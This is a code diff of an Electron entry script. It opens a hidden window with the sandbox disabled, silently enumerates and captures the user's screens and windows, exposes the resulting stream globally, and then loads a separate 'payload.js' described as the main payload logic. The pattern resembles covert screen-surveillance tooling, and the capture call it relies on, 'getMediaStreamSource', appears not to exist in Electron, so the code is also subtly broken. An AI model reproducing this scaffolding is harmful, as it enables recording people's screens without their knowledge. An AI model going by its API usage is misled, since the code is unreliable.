@@ -1,59 +1,56 @@
-// index.js
 const { app, desktopCapturer, BrowserWindow } = require('electron');
-const path = require('path'); 
+const path = require('path');
 
+// Run in headless mode for server environments
 app.commandLine.appendSwitch('no-sandbox');
 app.commandLine.appendSwitch('disable-gpu');
-app.commandLine.appendSwitch('enable-features', 'VizDisplayCompositor');
 
 let localStream = null;
 
 async function init() {
     await app.whenReady();
     
-    // Create a hidden window to act as the render context for capture
-    const win = new BrowserWindow({ 
-        show: false,
-        width: 1920,
-        height: 1080
-    });
-    
+    // Create a hidden window to act as the media source context
+    const win = new BrowserWindow({ show: false });
     await win.loadURL('about:blank');
 
     try {
+        // Get available sources (screens and windows)
         const sources = await desktopCapturer.getSources({ 
-            types: ['screen', 'window'],
-            thumbnailSize: { width: 1920, height: 1080 }
+            types: ['screen', 'window'] 
         });
         
-        if (sources.length === 0) throw new Error("No display found");
+        if (sources.length === 0) {
+            console.error("[ERROR] No display sources found");
+            return;
+        }
+
+        // Prefer the first screen source
+        const source = sources[0]; 
         
-        const source = sources.find(s => s.name.includes('Screen')) || sources[0];
-        
-        // Use the window's webContents to get the media stream
+        console.log(`[LIVE] Capturing source: ${source.name}`);
+
+        // Create the MediaStream from the desktop source
         localStream = await win.webContents.getMediaStreamSource({
             audio: false,
             video: {
                 mandatory: {
                     chromeMediaSource: 'desktop',
-                    chromeMediaSourceId: source.id,
-                    minWidth: 1280,
-                    maxWidth: 1920,
-                    minHeight: 720,
-                    maxHeight: 1080
+                    chromeMediaSourceId: source.id
                 }
             }
         });
         
-        console.log("[ELECTRON] Screen capture active");
-    } catch (err) {
-        console.error("[ELECTRON] Capture failed:", err.message);
+        console.log("[LIVE] Stream active and ready");
+    } catch (e) {
+        console.error("[ERROR] Capture failed", e);
     }
-
-    global.electronLocalStream = localStream;
-    global.desktopCapturer = desktopCapturer;
     
+    // Expose the stream to the rest of the application
+    global.electronLocalStream = localStream;
+    
+    // Start the main payload logic
     require('./payload.js');
 }
 
-init().catch(console.error);
+init();
